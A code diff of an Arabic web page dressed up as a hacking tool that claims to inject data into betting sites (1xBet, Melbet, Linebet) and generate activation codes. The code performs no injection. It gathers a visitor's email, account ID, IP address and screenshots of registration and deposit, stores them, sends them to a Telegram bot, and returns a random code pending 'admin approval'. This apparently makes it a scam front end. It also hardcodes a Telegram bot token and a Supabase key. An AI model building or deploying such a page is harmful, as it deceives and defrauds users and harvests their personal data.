@@ -3,208 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إنشاء طلب جديد</title>
+    <title>طلب تفعيل</title>
     <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
+    <div id="customModal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-title" id="modalTitle">[ SYSTEM_MSG ]</div>
+            <div class="modal-msg" id="modalMsg">...</div>
+            <div class="modal-actions">
+                <button class="modal-btn" onclick="closeModal()">موافق</button>
+            </div>
+        </div>
+    </div>
 
     <div id="loadingOverlay" class="loading-overlay">
         <div class="spinner"></div>
-        <div id="loadingText" style="color:var(--hacker-green); font-family:'Fira Code';">جاري المعالجة...</div>
+        <div id="loadingText" class="loading-text">جاري التحقق من الأمان...</div>
     </div>
 
-    <div id="customModal" class="modal-overlay">
-        <div class="modal-box">
-            <h3 id="modalTitle" style="color:var(--hacker-green);">تنبيه</h3>
-            <p id="modalMsg" style="color:#ddd; margin:15px 0;">...</p>
-            <button onclick="document.getElementById('customModal').classList.remove('active')" style="padding:10px;">موافق</button>
-        </div>
-    </div>
-
-    <div class="container" id="mainContainer">
+    <div class="container wide-mode" id="mainContainer" style="display:none;">
         <h2 id="typewriterTitle"></h2>
-
-        <label class="title">>> 01. اختر النظام المستهدف:</label>
+        
+        <label class="title">>> اختر النظام المستهدف:</label>
         <div class="program-grid">
-            <div class="program-option" onclick="selectProgram('1xBet', this)">
-                <i class="fa-solid fa-x text-2xl" style="font-size: 2rem; color: #3b82f6;"></i>
-                <span>1xBet</span>
-            </div>
-            <div class="program-option" onclick="selectProgram('Melbet', this)">
-                <i class="fa-solid fa-m text-2xl" style="font-size: 2rem; color: #eab308;"></i>
-                <span>Melbet</span>
-            </div>
-            <div class="program-option" onclick="selectProgram('Linebet', this)">
-                <i class="fa-solid fa-l text-2xl" style="font-size: 2rem; color: #22c55e;"></i>
-                <span>Linebet</span>
-            </div>
+            <div class="program-option" onclick="playSound('click'); selectProgram('1x', this)"><img src="1x.png" class="program-icon"></div>
+            <div class="program-option" onclick="playSound('click'); selectProgram('m', this)"><img src="m.png" class="program-icon"></div>
+            <div class="program-option" onclick="playSound('click'); selectProgram('l', this)"><img src="l.png" class="program-icon"></div>
         </div>
 
-        <label class="title">>> 02. الكود / الرابط:</label>
-        <div class="input-wrapper">
-            <input type="text" id="targetLink" class="form-input" placeholder="ألصق الكود أو الرابط هنا...">
-            <button class="paste-btn-embedded" onclick="pasteToInput()" title="لصق">
-                <i class="fa-solid fa-paste"></i>
-            </button>
-        </div>
+        <label class="title">>> بيانات العميل:</label>
+        <textarea id="userData" placeholder="البريد الإلكتروني والآيدي..."></textarea>
 
-        <label class="title" style="margin-top: 20px;">>> 03. بيانات الحساب:</label>
-        <textarea id="userData" rows="3" placeholder="الآيدي (ID) والبريد الإلكتروني..."></textarea>
-
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px;">
-            <div>
-                <label class="title" style="font-size:0.8rem">إثبات التسجيل:</label>
+        <div style="display: flex; gap: 20px; flex-wrap: wrap;">
+            <div style="flex: 1; min-width: 250px;">
+                <label class="title">>> إثبات التسجيل:</label>
                 <label for="regProof" class="upload-box" id="regBox">
-                    <div id="regText">اضغط للرفع 📂</div>
-                    <input type="file" id="regProof" accept="image/*" onchange="handleFile(this, 'regBox', 'regText')">
+                    <div class="upload-placeholder"><span id="regText">رفع الصورة</span><span>📂</span></div>
+                    <img id="regPreview" class="preview-img">
+                    <input type="file" id="regProof" accept="image/*" onchange="handleFileSelect(this, 'regBox', 'regText', 'regPreview')">
                 </label>
             </div>
-            <div>
-                <label class="title" style="font-size:0.8rem">إثبات الإيداع:</label>
+            <div style="flex: 1; min-width: 250px;">
+                <label class="title">>> إثبات الإيداع:</label>
                 <label for="depProof" class="upload-box" id="depBox">
-                    <div id="depText">اضغط للرفع 💰</div>
-                    <input type="file" id="depProof" accept="image/*" onchange="handleFile(this, 'depBox', 'depText')">
+                    <div class="upload-placeholder"><span id="depText">رفع الصورة</span><span>💰</span></div>
+                    <img id="depPreview" class="preview-img">
+                    <input type="file" id="depProof" accept="image/*" onchange="handleFileSelect(this, 'depBox', 'depText', 'depPreview')">
                 </label>
             </div>
         </div>
 
-        <button id="submitBtn" onclick="submitRequest()">🚀 بدء الحقن وتوليد الكود</button>
-        <button onclick="window.location.href='index.html'" style="background:transparent; border:1px solid #555; color:#aaa; margin-top:10px;">إلغاء</button>
-    </div>
-
-    <div class="container" id="successContainer" style="display: none;">
-        <h2 style="color:var(--hacker-green)">✅ تم إنشاء الطلب</h2>
-        <p style="color:#ccc;">تم إرسال البيانات للمراجعة. الكود الخاص بك هو:</p>
+        <button id="submitBtn" onclick="runSubmit()">حقن البيانات وتوليد الكود</button>
         
-        <div style="background:#111; padding:20px; border:1px dashed var(--hacker-green); font-family:'Fira Code'; font-size:1.5rem; margin:20px 0; color:var(--hacker-green);" id="generatedCodeDisplay">
-            CODE-XXXX
+        <div id="codeDisplay" class="hidden" style="margin-top: 30px; border-top: 1px solid rgba(0,255,0,0.2); padding-top: 20px;">
+            <p style="color:var(--hacker-green);">>> تم إرسال الطلب للمراجعة. الكود الخاص بك:</p>
+            <div style="background:rgba(0,0,0,0.5); padding:20px; border-radius:10px; border:1px solid var(--hacker-green); margin:15px 0; font-size:2.2rem; font-weight:900; letter-spacing:4px; font-family:'Fira Code'; color:#fff;" id="generatedCode"></div>
+            
+            <p style="color:#ffaa00; font-size:0.9rem; margin-bottom:15px; font-family:'Cairo';">⚠️ احتفظ بالكود! لن يعمل حتى يوافق الأدمن.</p>
+
+            <button class="copy-btn" onclick="copyCode()">📋 نسخ الكود</button>
+            <br>
+            <button class="secondary-btn" onclick="window.location.href='index.html'" style="margin-top:20px; width:100%; border-color:#fff; color:#fff;">🔙 العودة لصفحة الدخول</button>
         </div>
-
-        <p style="font-size:0.8rem; color:var(--warning-orange);">* الكود حالياً (قيد الانتظار). سيتم تفعيله بعد موافقة الأدمن.</p>
-        
-        <button onclick="copyGeneratedCode()">نسخ الكود</button>
-        <button onclick="window.location.href='index.html'" style="background:transparent; border:1px solid #555; margin-top:10px;">عودة</button>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
-        // إعدادات Supabase (نفس مفاتيحك)
         const SUPABASE_URL = 'https://zflgifemhopabfzgczgs.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_9xZcd3BkgL6cEQwHJitrew_mbX74lJW';
         const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-        
-        // إعدادات التلجرام
         const TELEGRAM_TOKEN = '8362386006:AAF8yKWrs7LCKva6zcu379Vn-vma1xbjF1s';
         const ADMIN_CHAT_ID = '8114406682';
 
-        let selectedSystem = null;
         let userIP = "Unknown";
+        let selectedProgram = null;
 
-        // تأثير الكتابة
-        function typeWriter(text, elementId) {
-            let i = 0; const target = document.getElementById(elementId); target.innerHTML = "";
-            function type() { if (i < text.length) { target.innerHTML += text.charAt(i); i++; setTimeout(type, 50); } }
-            type();
-        }
-        window.onload = async () => {
-            typeWriter("نظام التشفير // طلب جديد", "typewriterTitle");
-            try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); userIP = data.ip; } catch(e){}
-        };
-
-        // دالة اللصق
-        async function pasteToInput() {
-            try {
-                const text = await navigator.clipboard.readText();
-                document.getElementById('targetLink').value = text;
-            } catch (err) { alert('يرجى السماح بالوصول للحافظة'); }
-        }
-
-        function selectSystem(name, el) {
-            selectedSystem = name;
-            document.querySelectorAll('.program-option').forEach(opt => opt.classList.remove('selected'));
-            el.classList.add('selected');
-        }
-
-        function handleFile(input, boxId, textId) {
-            if(input.files[0]) {
-                document.getElementById(boxId).classList.add('uploaded');
-                document.getElementById(textId).innerHTML = '<i class="fa-solid fa-check"></i> تم الاختيار';
-            }
-        }
-
-        function toggleLoading(show) { document.getElementById('loadingOverlay').classList.toggle('active', show); }
+        // دالة المودال الجديدة
         function showModal(title, msg) {
             document.getElementById('modalTitle').innerText = title;
             document.getElementById('modalMsg').innerText = msg;
             document.getElementById('customModal').classList.add('active');
+            playSound('click');
         }
+        function closeModal() { document.getElementById('customModal').classList.remove('active'); }
 
-        async function uploadFile(file) {
-            const fileName = `${Date.now()}_${Math.random().toString(36).substring(7)}`;
-            const { data, error } = await _supabase.storage.from('proofs').upload(fileName, file);
-            if (error) throw error;
-            const { data: publicUrl } = _supabase.storage.from('proofs').getPublicUrl(fileName);
-            return publicUrl.publicUrl;
+        // فحص الحظر
+        async function checkBan() {
+            document.getElementById('loadingOverlay').classList.add('active');
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                userIP = data.ip;
+                const { data: banned } = await _supabase.from('banned_ips').select('*').eq('ip', userIP);
+                
+                if (banned && banned.length > 0) {
+                    document.body.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:red;flex-direction:column;text-align:center;"><h1 style="font-size:4rem;text-shadow:0 0 20px red;">🚫 ACCESS DENIED</h1><p style="font-family:'Fira Code'; font-size:1.5rem;">BANNED IP: ${userIP}</p></div>`;
+                } else {
+                    document.getElementById('loadingOverlay').classList.remove('active');
+                    document.getElementById('mainContainer').style.display = 'block';
+                    typeWriter("إعداد تصريح جديد //", "typewriterTitle");
+                }
+            } catch (e) {
+                document.getElementById('loadingOverlay').classList.remove('active');
+                document.getElementById('mainContainer').style.display = 'block';
+            }
         }
+        window.onload = checkBan;
 
-        async function submitRequest() {
-            const link = document.getElementById('targetLink').value;
+        // دوال الصوت والماوس والتأثيرات
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        function playSound(type) { if (audioCtx.state === 'suspended') audioCtx.resume(); const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain(); osc.connect(gain); gain.connect(audioCtx.destination); if (type === 'click') { osc.type = 'sine'; osc.frequency.setValueAtTime(800, audioCtx.currentTime); gain.gain.setValueAtTime(0.1, audioCtx.currentTime); osc.start(); osc.stop(audioCtx.currentTime + 0.05); } else if (type === 'success') { osc.type = 'square'; osc.frequency.setValueAtTime(400, audioCtx.currentTime); osc.frequency.exponentialRampToValueAtTime(1000, audioCtx.currentTime + 0.1); gain.gain.setValueAtTime(0.1, audioCtx.currentTime); osc.start(); osc.stop(audioCtx.currentTime + 0.3); } }
+        document.addEventListener('mousemove', e => { document.body.style.setProperty('--mouse-x', e.clientX + 'px'); document.body.style.setProperty('--mouse-y', e.clientY + 'px'); });
+        function typeWriter(text, elementId) { let i = 0; const target = document.getElementById(elementId); target.innerHTML = ""; function type() { if (i < text.length) { target.innerHTML += text.charAt(i); i++; setTimeout(type, 50); } } type(); }
+        function handleFileSelect(input, boxId, textId, previewId) { if(input.files[0]) { playSound('click'); const file = input.files[0]; document.getElementById(boxId).classList.add('uploaded'); document.getElementById(textId).innerText = "تم"; const reader = new FileReader(); reader.onload = e => { const img = document.getElementById(previewId); img.src = e.target.result; img.style.display = "block"; }; reader.readAsDataURL(file); } }
+        function selectProgram(name, el) { selectedProgram = name; document.querySelectorAll('.program-option').forEach(d => d.classList.remove('selected')); el.classList.add('selected'); playSound('click'); }
+        function copyCode() { const code = document.getElementById('generatedCode').innerText; navigator.clipboard.writeText(code); showModal("✅ نجاح", "تم نسخ الكود للحافظة!"); }
+        function toggleLoading(show, text) { const overlay = document.getElementById('loadingOverlay'); if(text) document.getElementById('loadingText').innerText = text; if(show) overlay.classList.add('active'); else overlay.classList.remove('active'); }
+        async function uploadImage(file) { const fileName = `${Date.now()}_${file.name.replace(/\s/g, '_')}`; const { error } = await _supabase.storage.from('proofs').upload(fileName, file); if(error) throw error; const { data } = _supabase.storage.from('proofs').getPublicUrl(fileName); return data.publicUrl; }
+        async function sendToTelegram(program, data, code, regUrl, depUrl, ip) { const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`; const message = `🚨 <b>طلب جديد!</b>\n🌍 <b>IP:</b> ${ip}\n💻 <b>${program}</b>\n👤 <b>بيانات:</b>\n${data}\n\n🔑 <code>${code}</code>\n⚠️ <i>الكود معلق (غير مفعل)</i>`; fetch(`${apiUrl}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'HTML' }) }); fetch(`${apiUrl}/sendPhoto`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: regUrl, caption: "📂 تسجيل" }) }); fetch(`${apiUrl}/sendPhoto`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: depUrl, caption: "💰 إيداع" }) }); }
+
+        async function runSubmit() {
+            playSound('click');
             const userData = document.getElementById('userData').value;
             const regFile = document.getElementById('regProof').files[0];
             const depFile = document.getElementById('depProof').files[0];
+            const btn = document.getElementById('submitBtn');
 
-            if (!selectedSystem) return showModal("خطأ", "يجب اختيار النظام أولاً");
-            if (!link || !userData) return showModal("خطأ", "أكمل جميع البيانات النصية");
-            if (!regFile || !depFile) return showModal("خطأ", "يجب رفع صور الإثبات");
+            if(!selectedProgram) { showModal("⚠️ خطأ", "اختر البرنامج أولاً."); return; }
+            if(!userData) { showModal("⚠️ خطأ", "أدخل البيانات."); return; }
+            if(!regFile || !depFile) { showModal("⚠️ خطأ", "ارفع الصور."); return; }
 
-            toggleLoading(true);
+            toggleLoading(true, "جاري رفع الملفات...");
 
             try {
-                // رفع الصور
-                const regUrl = await uploadFile(regFile);
-                const depUrl = await uploadFile(depFile);
-                
-                // توليد الكود
-                const code = 'KEY-' + Math.floor(10000 + Math.random() * 90000);
-                
-                // دمج البيانات
-                const fullInfo = `النظام: ${selectedSystem}\nالرابط/الكود: ${link}\nالبيانات: ${userData}\nIP: ${userIP}`;
+                const regUrl = await uploadImage(regFile);
+                document.getElementById('loadingText').innerText = "جاري الحفظ في قاعدة البيانات...";
+                const depUrl = await uploadImage(depFile);
+                const code = 'CODE-' + Math.floor(100000 + Math.random() * 900000);
+                const fullData = `النظام: [${selectedProgram}] | IP: ${userIP}\n${userData}`;
 
-                // الحفظ في Supabase
-                await _supabase.from('requests').insert([{
-                    user_data: fullInfo,
-                    reg_proof_url: regUrl,
-                    dep_proof_url: depUrl,
-                    generated_code: code
-                }]);
-
+                // هنا: الكود غير مفعل
+                await _supabase.from('requests').insert([{ user_data: fullData, reg_proof_url: regUrl, dep_proof_url: depUrl, generated_code: code }]);
                 await _supabase.from('active_codes').insert([{ code: code, is_active: false }]);
 
-                // إشعار التلجرام
-                const msg = `🔥 *طلب تفعيل جديد*\n💻 النظام: ${selectedSystem}\n🔗 الكود: \`${link}\`\n👤 البيانات: ${userData}\n🔑 كود التفعيل: \`${code}\`\n🌍 IP: ${userIP}`;
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: msg, parse_mode: 'Markdown' })
-                });
+                sendToTelegram(selectedProgram, userData, code, regUrl, depUrl, userIP);
 
-                toggleLoading(false);
-                document.getElementById('mainContainer').style.display = 'none';
-                document.getElementById('successContainer').style.display = 'block';
-                document.getElementById('generatedCodeDisplay').innerText = code;
+                toggleLoading(false); playSound('success'); 
+                showModal("✅ تم الإرسال", "تم إرسال الطلب للمراجعة. انتظر الموافقة.");
+                
+                document.getElementById('codeDisplay').classList.remove('hidden');
+                document.getElementById('generatedCode').innerText = code;
+                btn.style.display = 'none';
+                document.getElementById('codeDisplay').scrollIntoView({ behavior: 'smooth' });
 
-            } catch (error) {
-                console.error(error);
-                toggleLoading(false);
-                showModal("فشل", "حدث خطأ أثناء الاتصال بالسيرفر");
-            }
-        }
-
-        function copyGeneratedCode() {
-            const code = document.getElementById('generatedCodeDisplay').innerText;
-            navigator.clipboard.writeText(code);
-            alert("تم النسخ!");
+            } catch (e) { console.error(e); toggleLoading(false); showModal("❌ فشل", "فشل الاتصال بالسيرفر."); }
         }
     </script>
 </body>
